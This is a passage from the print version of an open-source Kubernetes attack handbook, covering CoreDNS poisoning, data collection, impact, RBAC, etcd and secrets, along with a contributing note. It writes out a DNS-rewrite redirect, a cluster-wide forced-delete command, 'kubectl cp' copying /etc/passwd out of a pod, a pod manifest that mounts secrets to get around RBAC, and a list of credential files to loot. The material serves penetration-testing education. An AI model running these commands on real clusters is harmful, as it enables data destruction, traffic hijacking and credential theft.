If an attacker can edit this ConfigMap, they can add a <code>rewrite</code> rule that redirects traffic from <code>grahamhelton.com</code> to <code>kubenomicon.com</code> by adding in <code>rewrite name grahamhelton.com kubenomicon.com</code> into the config map.</p>
<p><img src="../images/Pasted%20image%2020240404133622.png" alt="" /></p>
<p>Editing the config map can be accomplished by running <code>kubectl get configmap coredns -n kube-system -o yaml &gt; poison_dns.yaml</code>, manually adding the file, and then running <code>kubectl apply -f poison_dns.yaml</code>, or by running <code>kubectl edit configmap coredns -n kube-system</code> and making changes.</p>
<p><img src="../images/Pasted%20image%2020240404133817.png" alt="" /></p>
<p>Once the ConfigMap has been edited, CoreDNS usually needs to be restarted. To do so run <code>kubectl rollout restart -n kube-system deployment/coredns</code>. Finally, we can re-run the previous <code>nslookup</code> command inside a pod to prove that our traffic to <code>grahamhelton.com</code> will be routed to <code>kubenomicon.com</code> by running <code>kubectl exec -it tcpdump -- nslookup grahamhelton.com</code>. This time, instead of the name servers being returned being the valid name server for <code>grahamhelton.com</code>, they are instead the name server for <code>kubenomicon.com</code>.</p>
<p><img src="../images/Pasted%20image%2020240404133935.png" alt="" /></p>
<a class="header" href="print.html#defending-30" id="defending-30"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è</p>
</blockquote>
<a class="header" href="print.html#references--resources" id="references--resources"><h1>References &amp; Resources</h1></a>
<ul>
<li><a href="https://kubernetes-threat-matrix.redguard.ch/lateral-movement/coredns-poisoning/">The redguard threat matrix has a great writeup on this</a>!</li>
<li><a href="https://www.aquasec.com/blog/dns-spoofing-kubernetes-clusters/">DNS spoofing on Kubernetes clusters</a> </li>
</ul>
<a class="header" href="print.html#arp-poisoning-and-ip-spoofing" id="arp-poisoning-and-ip-spoofing"><h1>ARP poisoning and IP spoofing</h1></a>
<p>ARP spoofing in Kubernetes is essentially the same as ARP spoofing in any other network, however, instead of spoofing other &quot;computers&quot;, you're typically spoofing other pods.</p>
<a class="header" href="print.html#attacking-3" id="attacking-3"><h1>Attacking</h1></a>
<p>The <a href="https://www.aquasec.com/blog/dns-spoofing-kubernetes-clusters/">Aqua Research Team has an AMAZING proof of concept using scapy</a>. I highly recommend reading through this if this.</p>
<a class="header" href="print.html#collection" id="collection"><h1>Collection</h1></a>
<p>Collection techniques are used by attackers to collect information through the cluster. This is typically exfiltration of data.</p>
<ul>
<li><a href="./Collection/Images_from_a_private_registry.md">Images from a private registry</a></li>
<li><a href="./Collection/Collecting_data_from_pod.md">Collecting Data From Pod</a></li>
</ul>
<a class="header" href="print.html#images-from-a--private-registry" id="images-from-a--private-registry"><h1>Images From A  Private Registry</h1></a>
<p>Images stored in a private container registry cannot be pulled into a Kubernetes cluster unless the cluster has some way to authenticate to the registry. If an attacker is able to gain access to the authentication credentials, they may be able to pull down the images on their own.</p>
<p>Collecting images may be useful to an attacker who is looking for secrets inside the container. Additionally, if an attacker is able to upload images to the registry, they could compromise the cluster. For more information see <a href="../Initial_access/Compromised_image_in_registry.md">Initial Access -&gt; Compromised images in registry</a>.</p>
<p><img src="../images/Pasted%20image%2020240404160908.png" alt="" /></p>
<p>If authenticated, images can be pulled from a registry by running <code>docker pull &lt;registry_URL&gt;/REPO/IMAGE:TAG</code></p>
<p><img src="../images/Pasted%20image%2020240404161723.png" alt="" /></p>
<p><img src="../images/Pasted%20image%2020240404160447.png" alt="" /></p>
<a class="header" href="print.html#defending-31" id="defending-31"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#collecting-data-from-pod" id="collecting-data-from-pod"><h1>Collecting data from pod</h1></a>
<p>Collecting data from a Pod is essentially the exfiltrating of data. This can be done in a near infinite amount of ways depending on what kind of tooling is available inside the pod (although you may need to get creative), but the intended way to copy data in and out of a Pod is by using the <code>kubectl cp</code> command</p>
<ul>
<li>To copy data INTO a pod: <code>kubectl cp ~/path/to/file.sh podname:/file.sh</code></li>
<li>To copy data OUT of a pod: <code>kubectl cp podname:etc/passwd passwd</code></li>
</ul>
<p><img src="../images/Pasted%20image%2020240404171643.png" alt="" /></p>
<a class="header" href="print.html#defending-32" id="defending-32"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#impact" id="impact"><h1>Impact</h1></a>
<p>Impact is a nebulous term for &quot;what can be done&quot; upon compromise. It should go without saying that the impact is highly dependent on your threat model. Advanced adversaries may aim to have as little initial impact as possible to avoid detection.</p>
<ul>
<li><a href="./Impact/Data_destruction.md">Data Destruction</a></li>
<li><a href="./Impact/Resource_hijacking.md">Resource Hijacking</a></li>
<li><a href="./Impact/Denial_of_service.md">Denial of Service</a> </li>
</ul>
<a class="header" href="print.html#data-destruction" id="data-destruction"><h1>Data Destruction</h1></a>
<p>The impact of data destruction is fairly obvious. If an attacker has the ability to destroy data, they may be able to delete information from the cluster. This can be both to cause denial of service, or to remove unbacked up data from a cluster.</p>
<p>The following command is the functionality equivalent to running <code>rm -rf --no-preserve-root /</code> on a normal Linux machine: <code>kubectl delete all --all --all-namespaces &lt;remove_this_to_run&gt; --grace-period=0 --force</code></p>
<a class="header" href="print.html#resource-hijacking" id="resource-hijacking"><h1>Resource Hijacking</h1></a>
<p>A common &quot;attack&quot; is running cryptominers on compromised infrastructure. Due to the nature of Kubernetes having the ability to scale up machines quickly, an attacker that is able to deploy Pods in a compromised cluster would be able to hijack the Node compute resources to mine cryptocurrency.</p>
<a class="header" href="print.html#resource-exhaustion" id="resource-exhaustion"><h1>Resource Exhaustion</h1></a>
<p>A sub category of Resource Hijacking is Resource exhaustion. If an attacker is able to identify that resources are automatically scaled up based on demand, they could execute an attack that would cost a company a large amount of money by flooding the service and thus causing extra compute to be used to scale with demand.</p>
<a class="header" href="print.html#denial-of-service" id="denial-of-service"><h1>Denial of service</h1></a>
<p>A denial of service attack in a Kubernetes cluster can range all the way from deleting all resources to taking down a single Pod to messing with a Node. </p>
<a class="header" href="print.html#fundamentals" id="fundamentals"><h1>Fundamentals</h1></a>
<a class="header" href="print.html#nodes" id="nodes"><h1>Nodes</h1></a>
<p><em>Worker nodes</em> exist within the <em>data plane</em> which is the plane in a Kubernetes cluster that carries out actions given from the control plan. This is where Pods are deployed and thus your applications reside. The data plane typically consists of:</p>
<ul>
<li><strong>Worker Node</strong>: One or more computers responsible for running workloads (such as pods)</li>
<li><strong>Kubelet</strong>: Process that runs on each Node. Responsible for executing tasks (such as deploying pods) provided to it by the API server.</li>
<li>Pod: An object that represents one or more containers (sometimes called workloads)</li>
</ul>
<p><img src="../images/Pasted%20image%2020240331202719.png" alt="" /></p>
<a class="header" href="print.html#master-node" id="master-node"><h1>Master Node</h1></a>
<p>The <em>Master Node(s)</em> exists within the <em>Control Plane</em> and carries out the administrative actions for interacting and managing Kubernetes. The control plane consists of:</p>
<ul>
<li><strong>API Server</strong>: The communication channel for any interaction with Kubernetes. Any interaction with Kubernetes must traverse the API server. <code>kubectl</code> is the normal way of interacting with the API server but it can also be communicated with via any tool capable of making API calls such as <code>curl</code>.</li>
<li><strong>Scheduler</strong>: Watches the API server and listens for Pods that have not been assigned to a worker node. The scheduler is responsible for finding a Node to place the pod on.</li>
<li><strong>etcd</strong>: Version controlled key/value store. This holds the current state of the cluster.</li>
<li><strong>Controller manager</strong>: Is a collection of <em>controllers</em> each of which have control loops that watch the <em>API Server</em> for state changes to the cluster and make changes if the actual state is different than the desired state.</li>
<li><strong>Cloud Controller Manager</strong>: Similar to the <em>Controller Manager</em> but interacts with your cloud provider's APIs.</li>
</ul>
<p>All of these components together are known as a <em>cluster</em>. Clusters can be configured in many ways, but a production environment is likely being run in a &quot;high availability&quot; configuration with at least 3 control plane nodes that are kept in sync and <code>n</code> number of worker nodes that Pods are deployed to.</p>
<p><img src="https://kubernetes.io/images/kubeadm/kubeadm-ha-topology-stacked-etcd.svg" alt="" />
Note that the <code>etcd</code> server can be configured in a few other ways than show above.</p>
<a class="header" href="print.html#attacking-nodes" id="attacking-nodes"><h1>Attacking Nodes</h1></a>
<p>It is <em>usually</em> true that gaining access root-level access to a node participating in kubernetes is very much the &quot;endgame&quot; for most environments. Root access to a kubernetes node allows an attacker to access information from all pods running on that node by exploring the <a href="https://docs.docker.com/storage/storagedriver/overlayfs-driver/">overlay2</a> storage driver, deploy <a href="../Persistence/Static_pods.md">Static Pods</a>, plunder <code>/etc/kubernetes</code> (discussed below), and more.</p>
<a class="header" href="print.html#etckubernetes" id="etckubernetes"><h1>/etc/kubernetes</h1></a>
<p><code>/etc/kubernetes</code> is where kubernetes information is stored in most default configurations.</p>
<ul>
<li><code>/etc/kubernetes</code>: This is where kubeconfig files typically live as well as configuation information for control plane components (if on a control-plane node)</li>
<li><code>/etc/kubernetes/manifests</code> is the path where the Kubelet looks for Pod manifests to deploy <a href="../Persistence/Static_pods.md">See Persistence -&gt; Static Pods</a>. There are a few default Pod manifests:
<ul>
<li>etcd.yaml</li>
<li>kube-apiserver.yaml</li>
<li>kube-controller-manager.yaml</li>
<li>kube-scheduler.yaml</li>
</ul>
</li>
</ul>
<p>Often times you can find very sensitive information in the <code>/etc/kubernetes</code> directory on a node such as <a href="../Initial_access/Kubeconfig_file.md">Initial Access -&gt; Kubeconfig file</a>. Which can be exfiltrated to an attacker machine to gain access to the cluster.</p>
<p><img src="../images/Pasted%20image%2020240325010843.png" alt="" /></p>
<a class="header" href="print.html#services" id="services"><h1>Services</h1></a>
<p>Services are used to expose groups of pods over a network. They connect a set of pods to an service name and IP address. They can almost be thought of as a reverse proxy. Instead of having to directly connect to a Pod (and having to know <em>how</em> to connect to it), a client only has to know how to reach the service which will then route the request to the available pod.</p>
<p><img src="../images/Pasted%20image%2020240402104130.png" alt="" /></p>
<ul>
<li>Image from <a href="https://nigelpoulton.com/explained-kubernetes-service-ports/">NigelPoulton</a> (Highly recommend <a href="https://nigelpoulton.com/explained-kubernetes-service-ports/">this explanation</a>)</li>
</ul>
<a class="header" href="print.html#clusterip" id="clusterip"><h2>ClusterIP</h2></a>
<p>ClusterIP services are only accessible from other pods running in the cluster.</p>
<pre><code class="language-yaml">apiVersion: v1  
# Defines the type as a Service
kind: Service  
metadata:  
  name: Backend  
spec:  
  # Defines the service type as ClusterIP
  type: ClusterIP  
  ports:  
  # The external port mapping
    - port: 80 
  # The internal port mapping (What port the pod is listening on)
      targetPort: 80  
  # Select which pods to expose with the ClusterIP
  selector:
     name: my-demo-pod   
     type: front-end-app

</code></pre>
<a class="header" href="print.html#nodeport" id="nodeport"><h2>Nodeport</h2></a>
<p>Exposes an app to the outside world</p>
<pre><code class="language-yaml">apiVersion: v1
kind: Service
metadata:
  name: test-nodeport
spec:
  type: NodePort
  selector:
    app: web
  ports:
  # The internal cluster port
  - port: 8080
    # Port the pod is listening on 
    targetPort: 80
    # The external port on cluster nodes
    nodePort: 1337 
</code></pre>
<a class="header" href="print.html#loadbalancer" id="loadbalancer"><h2>LoadBalancer</h2></a>
<a class="header" href="print.html#etcd" id="etcd"><h1>etcd</h1></a>
<p>While it's unlikely you'll need to directly interact with it, it's useful to know about the data store kubentes uses called etcd. Etcd is not a kubernetes specific technology, it's actually used by many other projects. According to the project site, etcd is:</p>
<blockquote>
<p>&quot;A strongly consistent, distributed key-value store that provides a reliable way to store data that needs to be accessed by a distributed system or cluster of machines. It gracefully handles leader elections during network partitions and can tolerate machine failure, even in the leader node.&quot;</p>
</blockquote>
<p>At a high level, it's a version controlled key value store that can be interacted with using the <code>etcdctl</code> tool. The most basic example of creating a key/value pair is by running the command <code>etcdctl put hello world</code>.</p>
<p>This very basic example simply maps the <em>key</em> of <code>hello</code> to the <em>value</em> of <code>world</code> which can then be queried by running <code>etcdctl get hello</code></p>
<p><img src="src/images/Pasted%20image%2020240325004034.png" alt="" /></p>
<p>If we write this output to json using <code>etcdctl get --write-out=json hello | jq</code> we can see that there is actually a little bit more going on under the hood. First, the key/value pair are base64 encoded. Second we can see that there is a <code>create_revision</code> and a <code>mod_revision</code> number. Notice how this output is very simliar to <code>kubectl get &lt;resource&gt; -o json</code> command.</p>
<p><img src="src/images/Pasted%20image%2020240325004338.png" alt="" /></p>
<p>By updating the vlaue stored in <code>hello</code> to <code>hacker</code> using <code>etcdctl put hello hacker</code>, we can see that the value has been updated after querying the etcd server with <code>etcdctl get --write-out =json hello | jq</code>.  Interestingly, if we want to access the first value it stored with <code>etcdctl get --rev 8 --write-outjson hello | jq</code>, we can query etcd for the revision it was created at (in this case, 8) and it will give us our original <code>world</code>  value.</p>
<p><img src="src/images/Pasted%20image%2020240325004538.png" alt="" /></p>
<p>Etcd utilizes the <a href="https://github.com/etcd-io/raft">raft protocol</a> to maintain state between nodes.</p>
<a class="header" href="print.html#rbac" id="rbac"><h1>RBAC</h1></a>
<p>The kubernetes Role-based access conrol (RBAC) system is probably one of the most important security controls available within kubernetes.</p>
<pre><code class="language-yaml">kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  namespace: default
  name: pod-copy
rules:
- apiGroups: [&quot;&quot;]
  resources: [&quot;pods/exec&quot;]
  verbs: [&quot;create&quot;]
</code></pre>
<a class="header" href="print.html#rbac-1" id="rbac-1"><h2>RBAC</h2></a>
<p>There is one interesting quirk - Kubernetes doesn't have users. Well, at least not in the standard sense. A &quot;user&quot; in Kubernetes is simply a identity. To denote these <em>identities</em>, Kubernetes uses certificates and only trusts certificates signed by the Kubernetes CA. To create an identity, you first create a client certificate and set the common name to the identity you wish to create. You then use the Kubernetes Certificate Authority to cryptographically sign the client certificate that represents an identity.</p>
<a class="header" href="print.html#creating-an-rbac-user" id="creating-an-rbac-user"><h2>Creating an RBAC user</h2></a>
<ol>
<li>Generate a key: <code>openssl genrsa -out dev.key 2048</code></li>
<li>Next, generate a certificate singing request (CSR) with the identity of &quot;dev&quot; and a group of &quot;developer&quot;: <code>open ssl -new -key dev.key -out dev.csr -subj&quot;/CN=dev/O=developer</code></li>
<li>Sign the CSR using the Kubernetes CA's certificate with a validity period of 30  days: <code>openssl x509 -req -in dev.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out dev_cert_signed.crt -days 30</code>
Now that this certificate has been signed by the Kubernetes CA, it can be embedded in a Kubeconfig file and a user with access to that kubeconfig file can assume the identity of <code>dev</code>. This can be used if you, for example, need to create an <code>Auditor</code> role that has read only access to the cluster.</li>
</ol>
<p>RBAC is then applied to an identity using 2 of the 4 following concepts, <em>Role</em> and <em>ClusterRole</em> or <em>RoleBinding</em> and <em>ClusterRoleBinding</em>.</p>
<ul>
<li><strong>Role</strong>: A role is a set of additive permissions. Anything that is not explicitly permitted is denied.</li>
</ul>
<pre><code class="language-yaml"># Example modified from: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
# The version of the kubernetes API you're using
apiVersion: rbac.authorization.k8s.io/v1
# The type of object to create. In this case, a role.
kind: Role # Or ClusterRole
metadata:
  # The namespace your role is allowed access to. Omit if ClusterRole
  namespace: default
  # The name of the role
  name: pod-reader
rules:
# Which API group can be accessed. &quot;&quot; indicates the core API group
- apiGroups: [&quot;&quot;] 
  # The resource able to be accessed with verbs 
  resources: [&quot;pods&quot;]
  # What the role is allowed to access with kubectl
  verbs: [&quot;get&quot;, &quot;watch&quot;, &quot;list&quot;]
</code></pre>
<ul>
<li><strong>ClusterRole</strong>: The same as a role, but is not &quot;namespaced&quot; which means ClusterRoles apply to the entire cluster, making them more powerful.</li>
</ul>
<pre><code class="language-yaml"># Example modified from: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
# The version of the kubernetes API you're using
apiVersion: rbac.authorization.k8s.io/v1
# The type of object to create. In this case, a role.
kind: ClusterRole 
metadata:
  name: pod-reader
rules:
# Which API group can be accessed. &quot;&quot; indicates the core API group
- apiGroups: [&quot;&quot;] 
  # The resource able to be accessed with verbs 
  resources: [&quot;pods&quot;]
  # What the role is allowed to access with kubectl
  verbs: [&quot;get&quot;, &quot;watch&quot;, &quot;list&quot;]
</code></pre>
<ul>
<li><strong>RoleBinding</strong>: Binds the permissions defined in a <em>Role</em> to an identity.</li>
</ul>
<pre><code class="language-yaml"># Example modified from: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
# The version of the kubernetes API you're using
apiVersion: rbac.authorization.k8s.io/v1
# This role binding allows &quot;jane&quot; to read pods in the &quot;default&quot; namespace.
kind: RoleBinding # Or ClusterRoleBinding
metadata:
  name: read-pods
  # Omit if ClusterRoleBinding
  namespace: default 
subjects:
# You can specify more than one &quot;subject&quot;
- kind: User
  name: jane 
  apiGroup: rbac.authorization.k8s.io
roleRef:
  # this must be Role or ClusterRole
  kind: Role 
  # this must match the name of the Role or ClusterRole you wish to bind to
  name: pod-reader 
  apiGroup: rbac.authorization.k8s.io
</code></pre>
<ul>
<li><strong>ClusterRoleBinding</strong>: The same as a <em>RoleBinding</em>, but for <em>ClusterRoles</em></li>
</ul>
<pre><code class="language-yaml"># Example modified from: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
# The version of the kubernetes API you're using
apiVersion: rbac.authorization.k8s.io/v1
# This role binding allows &quot;jane&quot; to read pods in the &quot;default&quot; namespace.
kind: ClusterRoleBinding
metadata:
  name: read-pods
subjects:
# You can specify more than one &quot;subject&quot;
- kind: User
  name: jane 
  apiGroup: rbac.authorization.k8s.io
roleRef:
  # this must be Role or ClusterRole
  kind: ClusterRole 
  # this must match the name of the Role or ClusterRole you wish to bind to
  name: pod-reader 
  apiGroup: rbac.authorization.k8s.io
</code></pre>
<p>Roles and cluster roles can be queried for using <code>kubectl get roles,clusterroles | grep -v system</code>. Note that it might be useful to remove the &quot;system&quot; accounts using <code>grep -v system</code>
<img src="src/images/Pasted%20image%2020240325022307.png" alt="" /></p>
<a class="header" href="print.html#rbac-limitations" id="rbac-limitations"><h1>RBAC Limitations</h1></a>
<p>RBAC permissions granted to a resource type do not have a way of determining which sub-resources you're targeting. For example, there is no way in RBAC to say &quot;Allow the user to only get the secret named my-secret&quot;.  Granting the permissions to get a secret means a user can get <em>all</em> secrets within that namespace.</p>
<p>Additionally, there is no field-level access control that would allow a user to edit only one field of a manifest. For example, to edit the namespace field of a manifest, a user would need full write permission to the manifest.</p>
<a class="header" href="print.html#references" id="references"><h1>References</h1></a>
<ul>
<li><a href="/Persistence/Container_service_account.html#find-rbac-associated-with-service-accounts">Find RBAC associated with service accounts</a></li>
</ul>
<a class="header" href="print.html#kubelet" id="kubelet"><h1>Kubelet</h1></a>
<a class="header" href="print.html#namespaces" id="namespaces"><h1>Namespaces</h1></a>
<p>Namespaces in Kubernetes are a way to segment a Kubernetes cluster, similar to how subnetting divides a network into smaller sub networks.  Namespaces are designed to share a cluster among different departments or logical groupings such as dev/test/prod. Namespaces are <em>not</em> intended to be used for workload isolation. For isolating workloads, multiple clusters should be used (although there are projects aimed at simplifying this). Namespaces provide a few other core features:</p>
<ul>
<li><strong>Resource Isolation</strong>: Resources such as CPU and memory can be limited by namespace. This prevents one team utilizing all the the resources in a cluster.</li>
<li><strong>Access Control</strong>: RBAC can be used to grant &quot;users&quot; access to only specific namespaces.</li>
<li><strong>Enforcing Network Policies</strong>: While not really a namespace specific feature, pods can by default communicate across namespaces, but network policies can be enforced at a namespace level to prevent this.</li>
<li><strong>Reduce Naming Confusion</strong>: Resources cannot have the same name within a namespace, but they can have the same name as a resource in another namespace.</li>
</ul>
<p>By default, kubernetes has 4 different namespaces, including <em>default</em>, <em>kube-node-lease</em>, <em>kube-public</em>, and <em>kube-system</em>. You can query namespaces with <code>kubectl get namespace</code></p>
<p>Namespaces are a resource boundary, they should not be considered a strong security boundary. Namespaces allow you to scope <a href="RBAC.md">RBAC</a>. </p>
<a class="header" href="print.html#secrets" id="secrets"><h1>Secrets</h1></a>
<p>A Secret is an object that stores sensitive information such as a password, token, key, etc. Secrets are deployed to a cluster just like any other object in kubernetes by creating a manifest and declaring the <code>kind</code> as a <code>Secret</code>. By default, secrets are <strong>NOT</strong> encrypted (although this <a href="https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/">can be configured</a>) and are stored as base64 strings.</p>
<p>Secrets designed to be a better way to pass sensitive information to applications. This means that sensitive information does not need to be hardcoded into an application, and instead the sensitive information can be stored by kubernetes which makes things a bit more secure and makes it easier to do tasks such as rotating credentials.</p>
<pre><code class="language-yaml">apiVersion: v1
kind: Secret
metadata:
  name: very-very-secret
data:
  very-secret-file: YWRtaW4gaGVzIGRvaW5nIGl0IHNpZGV3YXlzCg== 
</code></pre>
<p><img src="src/images/Pasted%20image%2020240325013909.png" alt="" /></p>
<a class="header" href="print.html#secret-types" id="secret-types"><h1>Secret types</h1></a>
<p>There are many different &quot;types&quot; of secrets but the default and most common is Opaque.</p>
<ul>
<li><strong>Opaque</strong>: Can hold almost any type of general data.</li>
<li><strong>Service Account</strong>: Stores.... service account tokens.</li>
</ul>
<a class="header" href="print.html#pod-considerations" id="pod-considerations"><h1>Pod Considerations</h1></a>
<p>An attacker who is able to create a pod in a namespace can mount any secret in that namespace into the Pod and read it in plain text even if RBAC does not allow for reading of secrets using a manifest simliar to the one below:</p>
<pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: very-very-secret 
spec:
  volumes:
    - name: secret-volume
      secret:
        secretName: very-very-secret 
  containers:
    - name: UWUntu-with-secret
      image: ubuntu 
      volumeMounts:
        - name: secret-volume
          readOnly: true
          # Where the secret is mounted to inside the Pod
          mountPath: &quot;/etc/secret-volume&quot;
</code></pre>
<p>For more information <a href="src/Credential_access/Container_service_account.md">See -&gt; Container Service Account</a>.</p>
<a class="header" href="print.html#encryption-at-rest-configuration" id="encryption-at-rest-configuration"><h1>Encryption at rest configuration</h1></a>
<p>It is possible to find the raw encryption key used to encrypt secrets within the <code>Kind: EncrpytionConfiguration</code> manifest. Ideally keys should be held outside of your kubernetes cluster in a key management system. An attacker who is able to grab the keys can simply decrypt the information.</p>
<pre><code class="language-yaml"># Pulled from: https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/
# CAUTION: this is an example configuration.
#          Do not use this for your own cluster!
#
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
      - configmaps
      - pandas.awesome.bears.example # a custom resource API
    providers:
      # This configuration does not provide data confidentiality. The first
      # configured provider is specifying the &quot;identity&quot; mechanism, which
      # stores resources as plain text.
      #
      - identity: {} # plain text, in other words NO encryption
      - aesgcm:
          keys:
            - name: key1
              secret: c2VjcmV0IGlzIHNlY3VyZQ==
            - name: key2
              secret: dGhpcyBpcyBwYXNzd29yZA==
      - aescbc:
          keys:
            - name: key1
              secret: c2VjcmV0IGlzIHNlY3VyZQ==
            - name: key2
              secret: dGhpcyBpcyBwYXNzd29yZA==
      - secretbox:
          keys:
            - name: key1
              secret: YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=
  - resources:
      - events
    providers:
      - identity: {} # do not encrypt Events even though *.* is specified below
  - resources:
      - '*.apps' # wildcard match requires Kubernetes 1.27 or later
    providers:
      - aescbc:
          keys:
          - name: key2
            secret: c2VjcmV0IGlzIHNlY3VyZSwgb3IgaXMgaXQ/Cg==
  - resources:
      - '*.*' # wildcard match requires Kubernetes 1.27 or later
    providers:
      - aescbc:
          keys:
          - name: key3
            secret: c2VjcmV0IGlzIHNlY3VyZSwgSSB0aGluaw==
</code></pre>
<a class="header" href="print.html#defending-33" id="defending-33"><h1>Defending</h1></a>
<p>From the <a href="https://kubernetes.io/docs/concepts/configuration/secret/">kubernetes documentation</a>:</p>
<ol>
<li>Enable Encryption at Rest for Secrets.</li>
<li>Enable or configure RBAC rules with least-privilege access to Secrets.</li>
<li>Restrict Secret access to specific containers.</li>
<li>Consider using external Secret store providers.</li>
</ol>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/security/secrets-good-practices/">Good practices for Kubernetes Secrets</a></li>
</ul>
<a class="header" href="print.html#interesting-files" id="interesting-files"><h1>Interesting Files</h1></a>
<ul>
<li>kubelet.conf (bootstrap-kubelet.conf during TLS bootstrap)</li>
<li>controller-manager.conf</li>
<li>scheduler.conf</li>
<li>admin.conf for the cluster admin and kubeadm itself</li>
<li>super-admin.conf for the cluster super-admin that can bypass RBAC</li>
<li><strong>ca.crt</strong>: The Kubernetes root-CA certificate</li>
<li><strong>ca.key</strong>: The Kubernetes root-CA private key</li>
<li><strong>sa.pub</strong>: The public key used by the controller manager when singing a Service Account</li>
<li><strong>sa.key</strong> The private key used by the controller manger when sigining a Service account</li>
<li><strong>config.json</strong>: The docker config file. Typically stored at <code>/home/user/.docker/config.json</code> Can contain credentials for pushing/pulling images to registries if configured with <code>docker login</code></li>
</ul>
<a class="header" href="print.html#contributing" id="contributing"><h1>Contributing</h1></a>
<p>The entire offensive security landscape relives HEAVILY on the time and expertise of other offensive security professionals through the tools and techniques we use everyday.</p>
<p>This project is only as useful as we (the community) make it. Things will change, attacks will evolve, and new attacks will be discovered. This project aims to help keep up with the changing attack surface, but I cannot do it alone. This entire project is open source, you can see all the source files <a href="https://github.com/kubenomicon/kubenomicon">here</a>. Should you have something to contribute, please don't hesitate to open a pull request to the GitHub repository.</p>
<p>I'm 100% sure that I have gotten some things wrong in this project. My hope is that by putting this together, we can get the ball rolling on creating more comprehensive documentation for attacking a Kubernetes cluster. The more we're able to document these attacks, the more easily we will be able to communicate the risk of an insecure cluster.</p>
<p>Are you new to the security industry but you've found something about this project lacking? Contributing to open source projects is a fantastic way to <a href="https://grahamhelton.com/blog/certificationindustrialcomplex/">demonstrate your competence</a> for future employers to see. Contributions that keep things up to date is always appreciated!</p>
<a class="header" href="print.html#pentesting-kubernetes" id="pentesting-kubernetes"><h1>Pentesting Kubernetes</h1></a>

                </div>

                <!-- Mobile navigation buttons -->
                

                

            </div>

            

            

        </div>


        <!-- Local fallback for Font Awesome -->
        <script>
            if ($(".fa").css("font-family") !== "FontAwesome") {
                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
            }
        </script>

        <!-- Livereload script (if served using the cli tool) -->
        

        

        

        
        <script>
            $(document).ready(function() {
                window.print();
            })
        </script>
        

        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS script -->
        

    </body>
</html>
